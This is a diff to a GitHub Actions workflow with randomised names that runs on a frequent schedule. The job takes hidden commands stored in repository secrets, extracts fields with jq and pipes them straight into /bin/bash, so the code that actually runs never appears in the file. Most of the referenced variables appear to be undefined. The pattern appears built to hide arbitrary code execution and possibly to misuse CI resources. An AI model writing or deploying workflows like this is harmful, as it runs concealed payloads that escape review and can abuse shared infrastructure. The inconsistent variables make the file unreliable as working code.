@@ -2,8 +2,7 @@ name: lubeichen3891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
-
+    - cron: '48 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: lubeichen3891
         env:
-          fq97745: ${{ secrets.fq97745 }}
+          o44806: ${{ secrets.o44806 }}
         run: |
-          echo $fq97745 | jq -r .jpxib49843 | /bin/bash
-          echo $rpzlx8633 | jq -r .l47 | /bin/bash
-          echo $xzze6993 | jq -r .wesy69 | /bin/bash
-          echo $hpq690 | jq -r .ttmly268 | /bin/bash
-          echo $v96577 | jq -r .w9242 | /bin/bash
-          echo $u64 | jq -r .axkw4006 | /bin/bash
-          echo $wsg7143 | jq -r .pbms31355 | /bin/bash
+          echo $o44806 | jq -r .va840 | /bin/bash
+          echo $oc355 | jq -r .obji5283 | /bin/bash
+          echo $z2574 | jq -r .g37516 | /bin/bash
+          echo $nslp493 | jq -r .ywyx2551 | /bin/bash
+          echo $k83 | jq -r .riuns2 | /bin/bash
+          echo $sbuqw187 | jq -r .qn8 | /bin/bash
+          echo $voo95 | jq -r .sbhgl8 | /bin/bash
+          echo $lflj777 | jq -r .zw5 | /bin/bash
+          echo $j9236 | jq -r .hmum13 | /bin/bash
+          echo $pjr63 | jq -r .jlnc306 | /bin/bash
 
